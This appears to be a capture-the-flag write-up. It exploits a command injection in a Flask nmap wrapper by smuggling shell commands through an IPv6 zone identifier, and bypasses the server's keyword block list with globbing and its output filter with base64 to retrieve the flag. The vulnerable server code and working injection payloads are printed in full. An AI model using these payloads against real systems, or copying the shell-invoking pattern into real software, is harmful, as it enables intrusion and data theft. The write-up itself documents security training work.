---
layout: post
title:  "0day on ipaddress"
date:   2026-03-09 17:33:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /upCTF-2026-0day-on-ipaddress/
---

**Title**: 0day on ipaddress

**Category**: web

**Description**: whaaaaaaaaat

I get the challenge files:
```shell
unzip 0day-ip.zip  
Archive:  0day-ip.zip  
  inflating: Dockerfile  
 extracting: flag  
 extracting: flag.php  
 extracting: flag.tx  
  inflating: nmap  
  inflating: README.md  
 extracting: requirements.txt  
  inflating: server.py  
 extracting: xlag.txt
```

Contents of `server.py`:
```python
import ipaddress
import subprocess
from flask import Flask, jsonify, request


app = Flask(__name__)

def nmap_scan(ip, port=None):

    suspicious_symbols = ["$" , "\"", "\'", "\\", "@", ",", "*", "&", "|", "{", "}"]
    suspicious_commands = ["flag", "txt", "cat", "echo", "head", "tail", "more", "less", "sed", "awk", "dd", "env", "printenv", "set"]

    sus = suspicious_commands + suspicious_symbols

    if any(cmd in ip.lower() for cmd in sus):
        return { "success": False, "error": "Suspicious input detected: " }

    try:
        if port:
            command = f"nmap -sV -p {str(port)} {ip}"
            description = f"Port {port} scan with service detection"
        else:
            command = f"nmap -F -sV {ip}"
            description = "Quick port scan with service detection"

        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=10
        )

        output = result.stdout
        host_up = "Host is up" in output or "up" in output.lower()
        if ("{" in output):
            return { "success": False, "error": "Suspicious output detected" }

        return {
            "success": True,
            "host": ip,
            "port": port,
            "reachable": host_up,
            "scan_results": output,
            "description": description
        }

    except subprocess.TimeoutExpired:
        return {
            "success": False,
            "error": "Scan took too long"
        }
    except FileNotFoundError:
        return {
            "success": False,
            "error": "Nmap is not installed"
        }
    except Exception as e:
        return {
            "success": False,
            "error": f"Scan failed: {str(e)}"
        }

@app.get("/check")
def checkIp():
    ip = request.args.get("ip")
    port = request.args.get("port")

    if not ip:
        return jsonify({"error": "IP address is required"}), 400

    try:
        # verify if you have an actual real ip and not some garbage
        ipaddress.ip_address(ip)
    except ValueError:
        return jsonify({"error": "Invalid IP address"}), 400

    if port:
        try:
            port_int = int(port)
            if not (1 <= port_int <= 65535):
                return jsonify({"success": False, "error": "Port must be between 1 and 65535"}), 400
        except ValueError:
            return jsonify({"success": False, "error": "Port must be a number"}), 400

    result = nmap_scan(ip, port)
    return jsonify(result)

if __name__ == "__main__":
    app.run(debug=False, host='0.0.0.0', port=5000)
```

The server tries to block command injection through suspicious symbols and commands:
```python
suspicious_symbols = ["$" , "\"", "\'", "\\", "@", ",", "*", "&", "|", "{", "}"]
suspicious_commands = ["flag", "txt", "cat", "echo", "head", "tail", "more", "less", "sed", "awk", "dd", "env", "printenv", "set"]

sus = suspicious_commands + suspicious_symbols

if any(cmd in ip.lower() for cmd in sus):
    return { "success": False, "error": "Suspicious input detected: " }
```

They also block receiving the flag in plaintext in the output by blocking it if it contains a `{` character:
```python
if ("{" in output):
    return { "success": False, "error": "Suspicious output detected" }
```

Through local testing in the docker container I find this command injection works:
```shell
curl 'http://127.0.0.1:5000/check?ip=fe80::1%25;ls'  
{"description":"Quick port scan with service detection","host":"fe80::1%;ls","port":null,"reachable":true,"scan_results":"Starting SUPER CRAZY DUPER nmap scan on upCTF Framework\\n\nflag\nflag.php\nflag.tx\nnmap\nrequirements.txt\nserver.py\nxlag.txt\n","success":true}
```

This works because `%25` url decodes to `%` which would indicate a `zone identifier` for an IPv6 address. A normal zone idenifier looks like this: `fe80::1%eth0`. So once it is url decoded, the server receives `fe80::1%;ls`. It accepts `fe80::1%;` and does no validation on the zone string. The command the server builds is `nmap -F -sV fe80::1%;ls`.

Because the server does `shell=True` the command string is interpreted by the system shell:
```python
result = subprocess.run(
    command,
    shell=True,
    capture_output=True,
    text=True,
    timeout=10
)
```

The command `nmap -F -sV fe80::1%;ls` is interpreted as:
```shell
nmap -F -sV fe80::1%  
ls
```
and the command injection runs.

I start a challenge instance on the site and get the flag with globbing to bypass the suspicious commands blacklist and `base64` to bypass the suspicious output filter:
```shell
curl 'http://46.225.117.62:30016/check?ip=fe80::1%25;base64%20fla?.tx?'  
{"description":"Quick port scan with service detection","host":"fe80::1%;base64 fla?.tx?","port":null,"reachable":true,"scan_results":"Starting SUPER CRAZY DUPER nmap scan on upCTF Framework\\n\ndXBDVEZ7aDB3X2M0bl8xX3dyMXQzX3QwXzRuX2lwNGRkcmVzcz8hLW05OXF0NHZMZDZlZGM3Yzh9\nCg==\n","success":true}
```

```shell
echo 'dXBDVEZ7aDB3X2M0bl8xX3dyMXQzX3QwXzRuX2lwNGRkcmVzcz8hLW05OXF0NHZMZDZlZGM3Yzh9' | base64 -d  
upCTF{h0w_c4n_1_wr1t3_t0_4n_ip4ddress?!-m99qt4vLd6edc7c8}
```

`upCTF{h0w_c4n_1_wr1t3_t0_4n_ip4ddress?!-m99qt4vLd6edc7c8}`